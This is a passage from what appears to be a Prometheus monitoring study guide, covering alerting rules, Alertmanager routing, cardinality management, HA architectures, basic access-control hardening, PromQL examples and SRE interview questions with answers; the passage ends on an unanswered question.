        regex: "go_.*|process_.*"
```

**Remote write sharding:** Prometheus maintains N shards (goroutines), each with their own queue. Series are assigned to shards via consistent hashing (same series → same shard for ordering). Prometheus auto-scales shard count based on queue depth.

**Remote read** allows Prometheus to transparently query external storage for time ranges beyond local retention, merging results with local data.

```yaml
remote_read:
  - url: "https://mimir.company.com/api/v1/read"
    read_recent: false    # Only use when local data is insufficient
```

## Out-of-Order Sample Handling (Prometheus 2.39+)

Prometheus expects strictly increasing timestamps per series. Out-of-order samples happen due to clock skew, Pushgateway batching, or remote write replay.

```yaml
# prometheus.yml — accept samples up to 10 minutes late
tsdb:
  out_of_order_time_window: 10m    # Default: 0 (disabled)
```

Before 2.39, out-of-order samples were silently rejected (data loss).

# 5. Alerting

## Recording Rules

Recording rules pre-compute frequently used or expensive PromQL expressions and save the result as a new time series. They run at the `evaluation_interval`.

```yaml
# rules/recording_rules.yml
groups:
  - name: http_rules
    interval: 15s
    rules:
      - record: job:http_requests:rate5m
        expr: sum by (job) (rate(http_requests_total[5m]))

      - record: job:http_request_errors:ratio_rate5m
        expr: |
          sum by (job) (rate(http_requests_total{status=~"5.."}[5m]))
          /
          sum by (job) (rate(http_requests_total[5m]))
```

**Naming convention:** `level:metric:operations` (e.g., `job:http_requests:rate5m`)

**Why use recording rules:**

- Dashboard performance — pre-computed metrics query instantly
- Consistent calculations — used across alerts, dashboards, and SLO reports
- Federation efficiency — only federate pre-aggregated recording rules, not raw metrics
- Query stability — complex PromQL in alert rules can behave differently under load

## Alert Rules

```yaml
# rules/alert_rules.yml
groups:
  - name: service_alerts
    rules:
      - alert: HighErrorRate
        expr: |
          job:http_request_errors:ratio_rate5m > 0.01

        for: 5m                       # Must persist for 5m before firing
                                      # Prevents flapping from transient spikes

        labels:                       # Used by Alertmanager routing
          severity: critical
          team: platform

        annotations:                  # Human-readable context
          summary: "High error rate on {{ $labels.job }}"
          description: |
            Error rate is {{ $value | humanizePercentage }}
            which is above the 1% SLO threshold.
          runbook_url: "https://wiki.company.com/runbooks/high-error-rate"
```

### Labels vs Annotations

- **Labels:** Identity of the alert. Used by Alertmanager routing, grouping, and deduplication. Must be low-cardinality. Changing a label creates a DIFFERENT alert identity.
- **Annotations:** Human-readable context. NOT used for routing. Can contain template expressions (`{{ $labels.job }}`, `{{ $value }}`). Can be high-cardinality.

### Template Variables in Annotations

```yaml
annotations:
  summary: "High error rate on {{ $labels.job }} in {{ $labels.namespace }}"
  description: "Current error rate: {{ $value | humanizePercentage }}"
  # humanize: 1234567 → "1.235M"
  # humanizeDuration: 3661 → "1h 1m 1s"
  # humanizePercentage: 0.0142 → "1.42%"
```

## Alert Lifecycle: inactive → pending → firing → resolved

```
INACTIVE → (expr returns results) → PENDING → (for duration elapses) → FIRING → (expr stops) → RESOLVED → INACTIVE
```

- **Inactive:** Expression returns no results — alert does not exist.
- **Pending:** Expression returns results but `for` duration has not elapsed. NOT sent to Alertmanager.
- **Firing:** Condition persisted for full `for` duration. Sent to Alertmanager every `resend_interval` (hardcoded 1 minute).
- **Resolved:** Expression stopped returning results. Resolution notification sent.

**No `for` clause:** Alert fires immediately on first evaluation — use for conditions that are always critical from moment zero (target down, disk full).

**Why Prometheus keeps re-sending firing alerts:** Alertmanager stores alerts in memory. If it restarts, re-sending ensures it learns about all firing alerts within 1 minute.

## Alertmanager

### Routing Tree

```yaml
route:
  receiver: 'default-receiver'
  group_by: ['alertname', 'cluster']
  group_wait: 30s          # Wait before first notification (batch alerts)
  group_interval: 5m       # Wait before updating group with new alerts
  repeat_interval: 4h      # Re-notify about still-firing alerts

  routes:
    # Routes evaluated TOP TO BOTTOM — first match wins
    - match:
        severity: critical
        team: platform
      receiver: pagerduty-platform

    - match:
        severity: critical
      receiver: pagerduty-general
      continue: true         # Keep evaluating — fan-out to multiple receivers

    - match:
        severity: warning
      receiver: slack-warnings
```

### Grouping Parameters Explained

- `group_by: ['alertname', 'cluster']` — alerts with same values for ALL group_by labels → same group → one notification. 50 pods failing in namespace=production → one grouped notification.
- `group_wait: 30s` — how long to wait before first notification. Batches alerts arriving within this window.
- `group_interval: 5m` — after first notification, wait this long before sending updates for new alerts joining the group.
- `repeat_interval: 4h` — re-notify about an already-notified group after this duration.

### Inhibition

When a high-severity alert fires, inhibition automatically silences related lower-severity alerts.

```yaml
inhibit_rules:
  - source_matchers:
      - severity="critical"
    target_matchers:
      - severity="warning"
    equal: ['alertname', 'cluster', 'namespace']
    # If critical alert fires for job=api, cluster=prod-east
    # → suppress matching warning alert for same job, cluster
```

### Silences

Temporary muting of alerts by label matchers. Created via Alertmanager UI or API.

```bash
# Create a silence via amtool
amtool silence add alertname=DeploymentRollout --duration=2h --comment="Planned deploy"
```

**Use cases:** Planned maintenance, known issues, deploys.

### resolve_timeout

```yaml
global:
  resolve_timeout: 5m
```

How long Alertmanager waits after it **stops receiving** a firing alert before declaring it resolved. Safety buffer against network blips between Prometheus and Alertmanager.

## Alert Noise Reduction Best Practices

1. **Always use `for` clause** for non-critical alerts — prevents transient spike flapping. 5m is the production standard.
2. **Use recording rules** as alert expressions — consistent, pre-computed, easier to debug.
3. **Gate on minimum traffic** — prevent divide-by-zero false alerts during quiet periods:
   ```
   error_rate > 0.01 AND total_requests > 10
   ```
4. **Group related alerts** — use `group_by` to batch related alerts into single notifications.
5. **Use inhibition** — suppress warning when critical is already firing for the same component.
6. **Design severity levels** — critical = pages on-call, warning = Slack notification, info = dashboard annotation.

# 6. Performance & Best Practices

## High Cardinality Mitigation

**Detection:**

- Monitor `prometheus_tsdb_head_series` — sudden jumps = cardinality bomb
- Monitor `rate(prometheus_tsdb_head_series_created_total[1h])` — sustained creation = churn
- TSDB status page (`/api/v1/status/tsdb`) — `labelValueCountByLabelName`, `seriesCountByMetricName`

**Prevention:**

- Set `sample_limit` on all scrape jobs
- Drop `pod_template_hash`, `controller_revision_hash` via labeldrop
- Normalize URL paths via replace rules (collapse `/api/users/12345` → `/api/users/:id`)
- Never use unbounded values as labels (user_id, request_id, UUID, IP address, timestamp)
- Use `body_size_limit` to catch runaway exporters

**Recovery after cardinality explosion:**

- Add `labeldrop` rule → new scrapes stop creating bad series immediately
- RAM recovers within 2-4 hours (after Head Block compaction flushes stale series)
- Disk recovers after full retention period (15 days default) OR use Admin API `delete_series` + `clean_tombstones` for immediate recovery

## Scrape Interval Trade-offs

| Interval | Pros | Cons |
|---|---|---|
| 5s | Near real-time, fine-grained | High CPU, memory, storage; rate() needs very short windows |
| 15s (default) | Good for SLO tracking, standard | The production standard |
| 30s | Lower resource usage | Slower alert detection |
| 60s | Minimal overhead | Miss short-lived spikes, poor SLO granularity |

**Production guidance:**

- SLO-critical services: 15s
- Infrastructure (node-exporter): 15s
- kube-state-metrics: 30-60s (state changes less frequently)
- Blackbox probes: 15-30s
- Pushgateway: match to batch job frequency (often 1-5m)

## Query Performance Considerations

- **rate() window:** Minimum 4× scrape interval. For 15s scrape, use [1m] minimum, [5m] standard.
- **Recording rules:** Pre-compute expensive aggregations — dashboards should query recording rules, not raw metrics.
- **topk() in Grafana:** Evaluates independently per timestamp — different series appear in top-N at different times, causing more lines than expected. Use topk in table/stat panels only, or pre-compute with recording rules for time series graphs.
- **Regex label matchers:** `{job=~".*"}` is expensive — it scans all series. Use exact matchers when possible.
- **Avoid `{__name__=~".+"}` in dashboards** — this selects every metric.

## Storage Optimization

- Use `write_relabel_configs` in remote_write to filter what goes to long-term storage (drop `go_.*`, `process_.*` internal metrics)
- Drop noisy metrics you never dashboard or alert on via `metric_relabel_configs`
- Use recording rules + shorter retention for raw metrics, longer retention for aggregates
- Size-based retention (`--storage.tsdb.retention.size`) prevents disk-full situations
- Monitor `prometheus_tsdb_storage_blocks_bytes` for storage growth trends

## Instrumentation Best Practices

- Define metrics at module/package level — never inside request handlers (causes double-registration panics in Go, unbounded memory in all languages)
- Use canonical units: seconds for duration, bytes for size
- Counter names should end in `_total`
- Histogram names should describe what is measured (e.g., `http_request_duration_seconds`)
- Keep label sets consistent across all instances of a metric
- Use the `_info` pattern for static metadata (gauge with value 1 and metadata labels)

# 7. Architecture & Design

## Prometheus in Kubernetes (EKS)

### Kubernetes Metrics Landscape

```
WHAT YOU WANT TO KNOW           →  USE THIS
─────────────────────────────────────────────────────
Is deployment healthy?          →  kube-state-metrics
How many pods Running?          →  kube-state-metrics
Pod crash looping?              →  kube-state-metrics
Node Ready?                     →  kube-state-metrics
CronJob completed?              →  kube-state-metrics

kubectl top nodes/pods NOW?     →  metrics-server (NOT scrapeable by Prometheus)
HPA scaling trigger?            →  metrics-server

Container CPU usage (Prom)?     →  cAdvisor (via kubelet scrape)
Container memory usage (Prom)?  →  cAdvisor (via kubelet scrape)

Node CPU, memory, disk?         →  Node Exporter
App request rate/latency?       →  Application SDK / custom exporter
Endpoint reachable?             →  Blackbox Exporter
```

**metrics-server is NOT a Prometheus exporter.** It collects from kubelet Summary API, stores only the latest value in memory, and serves the Kubernetes Metrics API (for `kubectl top` and HPA). It does NOT expose `/metrics`.

### kube-state-metrics Key Metrics

```
kube_deployment_status_replicas_available
kube_deployment_spec_replicas
kube_pod_status_phase{phase="Running|Pending|Failed"}
kube_pod_container_status_restarts_total
kube_pod_container_status_waiting_reason{reason="CrashLoopBackOff"}
kube_node_status_condition{condition="Ready",status="true"}
kube_job_status_failed
kube_cronjob_next_schedule_time
kube_pod_container_resource_requests{resource="cpu|memory"}
kube_pod_container_resource_limits{resource="cpu|memory"}
```

- Deploy Node Exporter on all EC2 instances (DaemonSet on EKS nodes, systemd service on standalone EC2)
- Use EC2 SD or file-based SD (from Terraform outputs) for dynamic discovery
- Tag instances with `monitoring=true` and filter in EC2 SD
- Copy EC2 tags (Name, Environment, Team) as Prometheus labels via relabel_configs
- For application metrics: deploy exporters alongside apps or instrument directly

## High Availability Setup

### Prometheus HA (Basic)

```
Run two identical Prometheus servers with the same configuration.
Both scrape the same targets independently.
Both evaluate the same rules independently.
Both send alerts to the same Alertmanager cluster.

Alertmanager deduplicates identical alerts from both instances.
Grafana queries either (or load-balances across both).

Limitations:
- Data is NOT synchronized — slight timing differences
- If one dies, you lose its local data (use remote write for durability)
- Storage doubles
```

**Alertmanager HA:** Alertmanager has built-in clustering via gossip protocol. Deploy 3+ instances — they automatically deduplicate and share state.

```yaml
# Start Alertmanager cluster
alertmanager --cluster.listen-address=0.0.0.0:9094 \
             --cluster.peer=alertmanager-1:9094 \
             --cluster.peer=alertmanager-2:9094
```

### For production HA with data durability: use remote write to Thanos/Mimir/VictoriaMetrics.

## Federation vs Remote Write/Read vs Sharding

### Federation

One Prometheus scrapes the `/federate` endpoint of other Prometheus servers.

**Critical rule:** NEVER federate raw high-cardinality metrics. ONLY federate pre-aggregated recording rules.

```yaml
# In the federation Prometheus
- job_name: "federate-us-east"
  honor_labels: true          # Preserve original labels
  metrics_path: /federate
  params:
    match[]:
      - '{__name__=~"job:.*"}'         # Pre-aggregated recording rules only
      - 'up'
      - 'ALERTS{alertstate="firing"}'
  static_configs:
    - targets: ["prometheus-us-east:9090"]
      labels:
        cluster: "us-east"
```

**Limitations:** Only pulls the most recent sample per series, not historical data. Not suitable as a long-term storage solution.

### Thanos

Wraps around existing Prometheus servers. Uses object storage (S3) for unlimited retention. Thanos Sidecar runs alongside each Prometheus and uploads blocks to object storage. Thanos Querier provides a global PromQL query interface across all Prometheus instances.

```
Prometheus + Thanos Sidecar → S3 (blocks)
                            ← Thanos Querier (global queries)
```

**Use when:** You have existing Prometheus servers, need global querying across clusters, scale is <50 Prometheus servers.

### Grafana Mimir

A centralized, horizontally scalable, multi-tenant long-term storage backend. Prometheus remote-writes into it.

Write path: Distributor → Ingesters → Object Storage
Read path: Query Frontend → Queriers → Ingesters + Store Gateways → Object Storage

Multi-tenancy via `X-Scope-OrgID` header — complete data isolation per tenant.

**Use when:** You need multi-tenancy, scale is 100s of Prometheus servers, building monitoring-as-a-service.

### VictoriaMetrics

Drop-in Prometheus replacement. 5-10x lower memory, 3-4x less disk space. Single binary or clustered. Accepts remote_write, speaks PromQL. Pragmatic choice when Thanos/Mimir is more complexity than your scale demands.

# 8. Security (Basics)

## Prometheus Exposure Risks

Prometheus has **no built-in authentication or authorization** by default. Anyone who can reach the Prometheus HTTP endpoint can:

- Read all scraped metrics (potential sensitive data in labels)
- Execute arbitrary PromQL queries
- View all discovered targets and their metadata
- Access the Admin API (if enabled) to delete data

## Access Control Best Practices

- **Never expose Prometheus directly to the internet.** Place it behind a reverse proxy (nginx, Envoy) with authentication.
- In Kubernetes, use NetworkPolicies to restrict access to the Prometheus pod.
- Use TLS for scraping (`tls_config` in scrape configs). Use `--web.config.file` for basic auth on the Prometheus server itself (Prometheus 2.24+).
- For EKS: use IAM roles for service accounts (IRSA) for EC2 SD credentials, never hardcode access keys.
- Enable `--web.enable-admin-api` only when needed — it allows data deletion.
- Use `write_relabel_configs` to prevent sensitive labels from reaching remote storage.
- Alertmanager has the same problem — no built-in auth. Place behind a reverse proxy.

```yaml
# web.config.yml — basic auth for Prometheus server
basic_auth_users:
  admin: $2y$10$...  # bcrypt hashed password

# Start with:
# prometheus --web.config.file=web.config.yml
```

## Exporters and Metrics Security

- `/metrics` endpoints on applications often expose internal details — sanitize what gets exposed
- Use `metric_relabel_configs` to drop sensitive labels before storage
- The Blackbox Exporter can probe internal services — restrict its network access
- Node Exporter exposes OS-level details — ensure only Prometheus can reach port 9100

# 9. PromQL (All Important Queries)

> All PromQL queries centralized here. No duplication.

## PromQL Fundamentals

### Instant Vector vs Range Vector

```promql
# Instant vector — one value per series at current time
http_requests_total{job="api"}

# Range vector — all samples in window per series (CANNOT graph directly)
http_requests_total{job="api"}[5m]

# Range vectors MUST be passed through functions to graph:
rate(http_requests_total[5m])     # per-second rate
increase(http_requests_total[1h]) # total increase over window
avg_over_time(up[5m])             # average over window
```

### Label Matchers

```promql
{method="GET"}            # exact match
{status!="200"}           # not equal
{status=~"5.."}           # regex match (RE2, fully anchored)
{job!~".*canary.*"}       # regex not-match
{job=~"api|payments"}     # OR via regex alternation
{env!=""}                 # label exists and is non-empty
```

**RE2 is fully anchored:** `{job=~"api"}` matches ONLY "api", NOT "api-server". Use `{job=~"api.*"}` for prefix matching.

### Offset Modifier

```promql
# Current request rate
rate(http_requests_total[5m])

# Request rate 1 week ago
rate(http_requests_total[5m] offset 1w)

# Week-over-week comparison (>1 = more traffic than last week)
rate(http_requests_total[5m]) / rate(http_requests_total[5m] offset 1w)
```

### Aggregation Operators

```promql
sum()      avg()      min()      max()      count()
stddev()   topk()     bottomk()  count_values()

# by clause — keep these labels, collapse everything else
sum by (job) (rate(http_requests_total[5m]))

# without clause — remove these labels, keep everything else
sum without (instance, pod) (rate(http_requests_total[5m]))
```

### Binary Operations and Vector Matching

```promql
# Arithmetic
rate(http_errors_total[5m]) / rate(http_requests_total[5m])

# Comparison (filters series not meeting condition)
process_resident_memory_bytes > 1e9

# bool modifier (returns 0/1 instead of filtering)
up == bool 1

# on() — explicit label matching
metric_a / on(job) metric_b

# group_left / group_right — many-to-one matching
metric_a * on(namespace) group_left(team) metric_b
```

### Subquery Syntax

```promql
# Rate of rate — track acceleration of request growth
max_over_time(rate(http_requests_total[5m])[1h:1m])
# Evaluates rate() every 1m over the past 1h, returns the max
```

# Swap usage
node_memory_SwapTotal_bytes - node_memory_SwapFree_bytes
```

### Disk

```promql
# Disk usage percentage
(1 - node_filesystem_avail_bytes{mountpoint="/"} / node_filesystem_size_bytes{mountpoint="/"}) * 100

# Disk space available
node_filesystem_avail_bytes{mountpoint="/"} / 1024 / 1024 / 1024

rate(node_network_receive_errs_total[5m])
rate(node_network_transmit_errs_total[5m])

# TCP connections by state
node_netstat_Tcp_CurrEstab
```

---

## Application Metrics

### Request Rate

```promql
# Total request rate per service
sum by (job) (rate(http_requests_total[5m]))

# Request rate per endpoint
sum by (job, handler, method) (rate(http_requests_total[5m]))

# Request rate per status code
sum by (job, status) (rate(http_requests_total[5m]))
```

### Error Rate

```promql
# Error ratio (5xx / total)
sum by (job) (rate(http_requests_total{status=~"5.."}[5m]))
/
sum by (job) (rate(http_requests_total[5m]))

# Error ratio only when there is traffic (avoid divide-by-zero)
(
  sum by (job) (rate(http_requests_total{status=~"5.."}[5m]))
  /
  sum by (job) (rate(http_requests_total[5m]))
)
and
sum by (job) (rate(http_requests_total[5m])) > 0

# 4xx error rate (client errors)
sum by (job) (rate(http_requests_total{status=~"4.."}[5m]))
/
sum by (job) (rate(http_requests_total[5m]))
```

### Latency (Histogram)

```promql
# p50 (median) latency across all pods of a service
histogram_quantile(0.50,
  sum by (le) (rate(http_request_duration_seconds_bucket[5m]))
)

# p95 latency per service
histogram_quantile(0.95,
  sum by (job, le) (rate(http_request_duration_seconds_bucket[5m]))
)

# p99 latency per service
histogram_quantile(0.99,
  sum by (job, le) (rate(http_request_duration_seconds_bucket[5m]))
)

# p99 latency per service AND endpoint
histogram_quantile(0.99,
  sum by (job, handler, le) (rate(http_request_duration_seconds_bucket[5m]))
)

# Average request duration (not a percentile — mean latency)
rate(http_request_duration_seconds_sum[5m])
/
rate(http_request_duration_seconds_count[5m])
```

**Critical pattern:** Always `sum by (le)` BEFORE `histogram_quantile()`. This sums bucket counts across all pods first, then computes the fleet-wide quantile. Computing per-pod quantiles and averaging them is mathematically incorrect.

### Availability / SLO

```promql
# Availability: percentage of successful requests
sum(rate(http_requests_total{status=~"2.."}[5m]))
/
sum(rate(http_requests_total[5m]))
* 100

# SLO burn rate: how fast are we consuming error budget?
# (error_rate / (1 - SLO_target))
# For 99.9% SLO:
(
  sum(rate(http_requests_total{status=~"5.."}[1h]))
  /
  sum(rate(http_requests_total[1h]))
) / 0.001
```

# 10. Interview Questions & Answers

> Curated questions covering the most frequently asked topics in SRE/DevOps interviews. Each answer is structured for clarity under pressure.

---

## Fundamentals

**Q: Why does Prometheus use a pull model instead of push?**

The pull model gives you a free health check — if a scrape fails, the target is immediately marked DOWN and you can alert on `up == 0`. With push, a dead service silently stops sending and the collector has no way to distinguish "healthy but quiet" from "dead." Pull also decouples applications from the monitoring system — services just expose `/metrics` and do not need to know who consumes them. You can point Prometheus at any endpoint and start collecting without changing the application. The tradeoffs are network access requirements (Prometheus must reach targets) and the Pushgateway workaround for batch jobs that exit before being scraped.

---

**Q: Walk me through what happens from when Prometheus starts to when a metric is queryable.**

Prometheus reads `prometheus.yml` on startup. The retrieval engine initializes service discovery — for Kubernetes SD it connects to the API server and lists pods, nodes, services. For each discovered target, `relabel_configs` run to filter and set the final target address and labels. The scrape manager spawns a goroutine per surviving target. Every `scrape_interval`, each goroutine fires HTTP GET to `<scheme>://<address><metrics_path>`. The response is parsed from text format into samples. `metric_relabel_configs` run on each sample. Surviving samples are written to the WAL (for crash recovery), then to the in-memory Head Block. Within milliseconds they are queryable via the HTTP API. Meanwhile, the rule evaluator runs on a separate goroutine, evaluating recording and alert rules against the TSDB at the `evaluation_interval`.

---

**Q: What happens to a Counter when a process restarts?**

The counter resets to zero because counters are stored in process memory. The `rate()` function automatically handles this — it detects when a counter value drops below its previous value and treats it as a reset, computing the correct per-second rate across the restart boundary. This is why you should always use `rate()` and never use raw counter values in queries or dashboards.

---

## Metric Types

**Q: What is the difference between a Histogram and a Summary?**

Both measure distributions like latency. The fundamental difference is where quantile calculation happens. A Histogram sends raw bucket counts to Prometheus and lets you calculate any quantile at query time using `histogram_quantile()` — this means you can aggregate across all your pods by summing bucket counts first. A Summary computes quantiles in the client library before sending — the quantiles are fixed at instrumentation time and you cannot aggregate them across instances because averaging percentiles is mathematically incorrect. In distributed systems, always prefer Histogram because you almost always need fleet-wide percentiles.

---

**Q: Can you aggregate Summary quantiles across multiple instances?**

No, and this is one of the most common mistakes. You mathematically cannot average percentiles. If pod A has a p99 of 200ms and pod B has a p99 of 400ms, the true p99 across both pods is NOT 300ms — it depends on the actual distribution of requests across those buckets. A Histogram solves this because you sum the raw bucket counts across all pods first using `sum by (le)`, then apply `histogram_quantile()` to the combined distribution.

---

**Q: Your p99 latency shows 450ms but your SLO is 200ms and actual request logs show most requests under 150ms. What could be wrong?**

The histogram bucket boundaries are too sparse around the SLO threshold. If buckets jump from 0.1s to 0.5s with nothing in between, `histogram_quantile()` uses linear interpolation across that gap and can report any value between 100ms and 500ms. The fix is to add denser bucket boundaries around your SLO thresholds. For a 200ms SLO, you need buckets at 0.1, 0.15, 0.2, 0.25, 0.3 so the interpolation has fine-grained data to work with. This requires redeploying the application — bucket boundaries are set at instrumentation time and cannot be changed retroactively.

---

## Cardinality

**Q: What is cardinality and why does it matter?**

Cardinality is the number of unique time series in Prometheus, determined by unique label-value combinations. Every distinct combination of metric name plus label set is a separate series stored in memory at approximately 3.5 KB each. High-cardinality labels — user IDs, request IDs, IP addresses — create an explosion of time series that consumes enormous memory and can crash Prometheus. A single metric with a `user_id` label across 1 million users creates 1 million series just for that one metric. Labels must always have bounded, low-cardinality values like status codes or HTTP methods.

---

**Q: You have a metric with a `user_id` label containing 2 million unique values. The label was added 3 days ago. What are your options?**

Four options in order of aggressiveness. First, add a `labeldrop` in `metric_relabel_configs` to stop new series creation immediately. The existing 2 million series persist in TSDB for the full retention period (15 days default). RAM recovers within 2-4 hours after Head Block compaction; storage recovers after retention expiry. Second, use the Admin API `delete_series` followed by `clean_tombstones` to immediately reclaim disk. This is destructive — those 3 days of per-user data are gone. Third, combine both: labeldrop for future prevention plus delete for immediate cleanup. Fourth, create a recording rule that aggregates away `user_id` — `sum by (method, status_code) (rate(http_requests_total[5m]))` — keeping a low-cardinality summary while the original expires naturally. The choice depends on whether the per-user data has business value.

---

**Q: Explain series churn and its impact.**

Series churn is the continuous creation and death of time series, commonly caused by label values that change on every deployment (like `pod_template_hash`). On the WAL: every new series creation writes a series record, making it grow faster and making restarts slower because the entire WAL must be replayed. In extreme cases, WAL replay takes 5-15 minutes. On compaction: each 2-hour block contains both active and dead series, so compaction processes far more data than the active count suggests, causing CPU spikes every 2 hours. On queries: label selector evaluation scans all historical series that ever matched in the retention window, including stale ones, making query time scale with total historical series rather than just active ones.

## Scraping & Service Discovery

**Q: What is the difference between relabel_configs and metric_relabel_configs?**

`relabel_configs` runs before the scrape — it operates on target metadata labels like `__address__` and `__meta_kubernetes_*` to decide which targets to scrape. Dropping a target here means no HTTP request is made, saving bandwidth. `metric_relabel_configs` runs after the scrape — the HTTP request already happened, the response is parsed, and now you filter or transform individual time series. Dropping a metric here still incurred the network cost of scraping. You cannot use `metric_relabel_configs` to prevent a scrape from happening.

---

**Q: How does Prometheus discover targets in Kubernetes?**

Prometheus uses `kubernetes_sd_configs` with one of five roles: node, pod, service, endpoints, or endpointslice. It queries the Kubernetes API server using a service account token. For pod discovery, it gets all pods with their IPs, ports, annotations, and labels — exposed as `__meta_kubernetes_*` labels. Then `relabel_configs` filter this list — the common pattern is keeping only pods with `prometheus.io/scrape: "true"` annotation — and extract port/path from annotations to set `__address__` and `__metrics_path__`. Kubernetes metadata like namespace, pod name, and app label are mapped to permanent time series labels via `replace` actions.

---

**Q: What happens if scrape_timeout is greater than scrape_interval?**

Prometheus fails to start and logs an error. This is validated at config load time. If timeout exceeded interval, Prometheus would potentially start a new scrape goroutine before the previous one finished, leading to concurrent scrapes of the same target and resource exhaustion.

---

**Q: How do you reload Prometheus configuration without downtime?**

Two methods. Send a SIGHUP signal: `kill -HUP <pid>`. Or HTTP POST to `/-/reload` (requires `--web.enable-lifecycle` flag). Both trigger a config reload without restarting the process. The retrieval engine picks up new scrape configs and service discovery changes. Rule files are re-read. Invalid configurations are rejected with a log error and the previous valid config continues operating.

---

## Storage

**Q: Explain the TSDB write path.**

Every scraped sample first goes to the Write-Ahead Log (WAL) on disk — sequential writes for crash recovery. Then the sample is written to the Head Block, which lives in RAM and covers approximately the most recent 2 hours. Queries against recent data are served entirely from the Head Block, which is why they are fast. Every 2 hours, the Head Block is flushed to disk as an immutable Persistent Block. Persistent blocks are periodically compacted — small blocks merged into larger ones following a 3× multiplier pattern (2h → 6h → 18h) up to a maximum of one-tenth of the retention period. On restart, Prometheus replays the WAL to reconstruct the Head Block, which is why WAL size directly impacts restart time.

---

**Q: What is the relationship between active series count and memory usage?**

Each active time series in the Head Block requires approximately 3,500 bytes of RAM — this includes the series labels, the open chunk, and the index entry. So 100k series ≈ 350 MB, 500k series ≈ 1.75 GB, 1M series ≈ 3.5 GB. The formula is: `prometheus_tsdb_head_series × 3,500 bytes ≈ expected RAM for TSDB`. If actual `process_resident_memory_bytes` significantly exceeds this estimate, series churn is likely the cause — dead series still consuming memory before compaction flushes them.

---

**Q: How does remote write handle outages?**

Remote write is WAL-backed. When the remote storage is temporarily unavailable, the remote write queue fills up and Prometheus continues writing to the WAL normally. When remote storage recovers, Prometheus replays from the WAL and catches up. This prevents data loss during short outages. However, if remote storage is down for too long, the WAL grows until either the storage recovers or WAL hits retention limits and old data is discarded. You should monitor `prometheus_remote_storage_samples_pending` (should be low) and `prometheus_remote_storage_samples_dropped_total` (should be zero — any drops mean data loss).

---

## Alerting

**Q: Explain the alert lifecycle from inactive to resolved.**

An alert starts Inactive — the expression returns no results. When the expression returns results (threshold crossed), the alert enters Pending state. During Pending, the `for` duration timer runs — the condition must persist continuously. If the expression stops returning results during Pending, the alert goes back to Inactive and the timer resets. Once the `for` duration elapses with the condition still true, the alert transitions to Firing — Prometheus sends it to Alertmanager via HTTP POST every resend_interval (1 minute, hardcoded). Alertmanager handles routing, grouping, and notification. When the expression stops returning results while Firing, Prometheus sends a resolution notification and the alert becomes Resolved, then returns to Inactive. Alertmanager has its own `resolve_timeout` (default 5m) — it waits that long after no longer receiving a firing alert before declaring it resolved, as a safety buffer against network interruptions.

---

**Q: What is the difference between labels and annotations in alert rules?**

Labels define the alert's identity and are used by Alertmanager for routing, grouping, and deduplication. They should be low-cardinality (severity, team, env). Changing a label creates a different alert identity — Alertmanager treats it as a completely separate alert. Annotations are human-readable context included in notifications — summaries, descriptions, runbook URLs, dashboard links. They support Go template expressions like `{{ $labels.job }}` and `{{ $value | humanizePercentage }}`. Annotations are NOT used for routing or deduplication. You can change annotations freely without affecting alert identity or routing behavior.

---

**Q: Explain group_by, group_wait, group_interval, and repeat_interval in Alertmanager.**

`group_by` defines which labels form an alert group — alerts with identical values for all group_by labels are batched into a single notification. For example, `group_by: ['alertname', 'cluster']` means 50 pods failing in the same cluster get one notification, not 50. `group_wait` (e.g., 30s) is how long Alertmanager waits before sending the first notification for a new group — gives time for more alerts to arrive and be batched. `group_interval` (e.g., 5m) is how long to wait before sending another notification if new alerts join an existing group. `repeat_interval` (e.g., 4h) controls how often Alertmanager re-notifies about an already-notified group that is still firing — prevents both forgetting about long-running issues and being paged every 5 minutes.

---

**Q: How does inhibition work in Alertmanager?**

Inhibition suppresses notifications for target alerts when a matching source alert is firing. You define rules that specify source matchers (e.g., `severity=critical`), target matchers (e.g., `severity=warning`), and `equal` labels that must match between source and target. When a critical alert fires for `alertname=HighErrorRate, cluster=prod-east`, it suppresses the matching warning alert with the same alertname and cluster values. This reduces noise — if the cluster is on fire (critical), you do not also need the "things are getting warm" warning for the same component.

---

## PromQL

**Q: Why can you not graph a range vector directly in Grafana?**

A range vector returns multiple data points per time series — a list of values within the time window. Grafana needs one value per series per timestamp to plot a line. A range vector gives many values per timestamp, which is ambiguous. You must reduce it with a function like `rate()`, `increase()`, `avg_over_time()`, or `delta()` that collapses the list into a single representative value — converting the range vector back to an instant vector.

---

**Q: Explain how rate() handles counter resets.**

When a process restarts, the counter drops to zero. `rate()` detects a reset whenever it sees the counter value decrease between two samples. When it detects a reset, it treats the new value as continuing from where the old counter left off. If the counter was at 1000 before restart and climbed to 60 after, `rate()` treats the total increase as 1060 over that time window, giving an accurate per-second rate that accounts for the reset transparently.

---

**Q: When would you use irate() over rate()?**

`irate()` uses only the last two data points in the window, making it sensitive to very short-lived spikes that `rate()` would smooth over. A 1-second traffic burst averaged over a 5-minute `rate()` window looks like a small blip, but `irate()` shows the true spike intensity. However, `irate()` is noisy and fragile — a single missed scrape leaves it with only one data point and it returns nothing. In practice, `rate()` is correct for 95% of production dashboards and ALL alerting rules. Use `irate()` only for debugging specific spike patterns in ad-hoc analysis.

---

**Q: What is the minimum recommended window size for rate()?**

The minimum window should be at least 4 times the scrape interval. For the standard 15-second scrape interval, the minimum meaningful window is [1m], and [5m] is the production standard. `rate()` needs at least 4 data points in the window to produce a reliable result. With only 2-3 points, a single missed scrape produces a wildly inaccurate rate or returns nothing.

---

**Q: What is the difference between rate() and increase()?**

Both operate on counters and handle resets. `rate()` gives the average per-second rate of increase — it divides total increase by window duration in seconds. `increase()` gives the total increase over the entire window in absolute terms — mathematically equivalent to `rate() × window_seconds`. Use `rate()` for requests-per-second in dashboards and alerts. Use `increase()` for "how many errors occurred in the last hour." Note: `increase()` can return non-integer values due to extrapolation at window boundaries — this is expected.

---

**Q: What happens when you divide by zero in PromQL?**

PromQL follows IEEE 754 — dividing by zero produces +Inf, not an error. This is dangerous in alerting: a comparison like `error_rate > 0.01` evaluates +Inf > 0.01 as true and fires even when there is zero traffic and therefore zero errors. The fix is to add an `and` clause gating on minimum traffic: only alert when error rate is high AND there are at least N requests per second.

---

**Q: Why does `{job=~"api"}` not match `"api-server"` in PromQL?**

Prometheus uses RE2 regex which is fully anchored by default — the pattern must match the entire label value, not a substring. `"api"` matches only the exact string "api". To match strings starting with "api" use `{job=~"api.*"}`. To match anything containing "api" use `{job=~".*api.*"}`.

---

**Q: What is the bool modifier?**

